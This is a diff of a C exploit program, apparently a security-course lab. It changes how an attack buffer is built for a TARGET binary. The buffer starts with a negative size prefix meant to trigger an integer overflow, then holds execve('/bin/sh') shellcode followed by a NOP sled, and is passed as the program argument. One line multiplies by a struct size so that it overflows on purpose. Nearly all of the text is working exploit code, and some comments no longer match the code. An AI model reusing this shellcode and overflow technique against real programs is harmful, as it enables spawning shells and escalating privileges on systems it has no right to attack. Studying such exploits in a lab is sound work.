@@ -33,24 +33,23 @@ int main(void)
 {
   char *args[3];
   char *env[1];
-  char buf[2816] = "2362232048,";  //unsigned int to read 2816 bytes, takes 11 bytes, next empty mem addr is buf[11]
+  char buf[2850] = "-1764004375,";  //unsigned int to read 2808 bytes, takes 11 bytes, next empty mem addr is buf[11]
   char sh[] = 
 "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
 "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
-"\x80\xe8\xdc\xff\xff\xff/bin/sh"
-"\x90\x90\x90"
-"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
-"\x90\x90\x90\x90\x77\x77\x77\x77";
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
-  int i = 0;
-  for (i; i < 2746; i++){    //leave room in buffer for shell code. After for-loop buf[2756] is next empty mem addr; 60 bytes til overflow 
-  	int x = 11+i;
-  	buf[x] = '\x90';
-  }
-	
- 	memcpy(&(buf[2756]), sh, sizeof(sh));  //copy shell code into buf, starting at buf[2756].
-
-
+  int i = 12;
+  for (i; i < 2850; i++){
+  	if(i < sizeof(sh) + 11){
+		buf[i] = sh[i-12];
+	}
+	else {
+  		buf[i] = '\x90';
+	} 
+	}
+  	unsigned int z = (-153391639  * sizeof(struct widget_t));
+	printf("MY MO FOKIN GLOCK: %d  ", z);
   args[0] = TARGET;
   args[1] = buf;
   args[2] = NULL;
